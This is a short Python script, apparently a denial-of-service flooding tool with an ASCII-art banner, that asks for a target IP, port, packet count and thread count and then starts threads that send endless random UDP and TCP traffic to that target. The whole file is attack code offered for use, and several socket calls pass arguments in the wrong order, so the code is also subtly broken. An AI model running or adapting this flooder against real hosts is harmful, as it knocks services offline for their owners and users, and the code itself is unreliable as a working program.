import socket
import random
import threading
import os,sys

os.system("clear")
print("""
▒██   ██▒ ▄▄▄       ██▓                     
▒▒ █ █ ▒░▒████▄    ▓██▒                     
░░  █   ░▒██  ▀█▄  ▒██░                     
 ░ █ █ ▒ ░██▄▄▄▄██ ▒██░                     
▒██▒ ▒██▒ ▓█   ▓██▒░██████▒                 
▒▒ ░ ░▓ ░ ▒▒   ▓▒█░░ ▒░▓  ░                 
░░   ░▒ ░  ▒   ▒▒ ░░ ░ ▒  ░                 
 ░    ░    ░   ▒     ░ ░                    
 ░    ░        ░  ░    ░  ░                 
                                            
 ▄▄▄▄    ▄▄▄      ▓█████▄  ▒█████   ██▀███  
▓█████▄ ▒████▄    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒
▒██▒ ▄██▒██  ▀█▄  ░██   █▌▒██░  ██▒▓██ ░▄█ ▒
▒██░█▀  ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░▒██▀▀█▄  
░▓█  ▀█▓ ▓█   ▓██▒░▒████▓ ░ ████▓▒░░██▓ ▒██▒
░▒▓███▀▒ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
▒░▒   ░   ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░   ░▒ ░ ▒░
 ░    ░   ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░░   ░ 
 ░            ░  ░   ░        ░ ░     ░     
      ░            ░                        """)
ip = str(input("[+] Ip  : "))
port = int(input("[+] Port : "))
paket = int(input("[+] Paket : "))
thread = int(input("[+] Thread : "))

def gas():
    data = random._urandom(1800)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(paket):
                s.sendto(gas,data)
            print("[×] Xalbador Is Here!!")
        except:
            print("Eror!!")

def gas2():
    data = random._urandom(16)
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data,gas2)
            for x in range(paket):
                s.send(data)
            print("[×] Xalbador Is Here!!")
        except:
            print("Eror!!")

            
for x in range(thread):
    th = threading.Thread(target = gas)
    th.start()
    th = threading.Thread(target = gas2)
    th.start()